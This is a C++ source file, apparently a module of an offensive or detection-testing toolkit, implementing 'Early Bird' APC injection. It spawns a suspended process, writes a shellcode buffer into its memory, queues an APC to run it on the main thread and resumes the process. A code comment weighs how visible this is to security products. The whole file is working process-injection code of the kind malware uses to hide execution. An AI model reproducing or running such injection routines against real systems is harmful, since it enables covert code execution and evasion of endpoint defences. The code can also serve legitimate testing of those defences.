#include <cstdio>

#include "sysapi.h"
#include "modules.h"
#include "logging.h"

namespace modules {

bool inject_queue_apc_early_bird(const std::wstring& original_image, RemoteProcessMemoryMethod memory_method) {

    bblog::info("[*] Preparing a new process");

    bblog::info("creating process...");

    auto process = sysapi::ProcessCreateUser(original_image, true);
    if (process.hProcess == NULL) {
        return false;
    }

    bblog::info("[*] Placing shellcode in the target process");

    RemoteProcessMemoryContext ctx;
    bool res = process_init_memory(ctx, memory_method, process.hProcess.get(), 0);
    if (!res) {
        return false;
    }

    ctx.Size = (ULONG)default_shellcode_size;

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    bblog::info("writing shellcode...");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    bblog::info("[*] Queueing APC with shellcode in main thread");

    res = sysapi::ThreadQueueUserApc(process.hThread.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
    if (!res) {
        return false;
    }

    // NOTE:
    // The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
    // so we don't need to search an alertable thread, APC will be executed immediately
    // On the other hand, running a suspended process and resuming threads are red flags for security solutions
    // but without suspension it will be a regular APC injection (but into a newly started process)
    // TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script

    bblog::info("resuming thread...");

    if (!ResumeThread(process.hThread.get())) {
        return false;
    }

    bblog::info("[+] Success");
    return true;
}

} // namespace modules
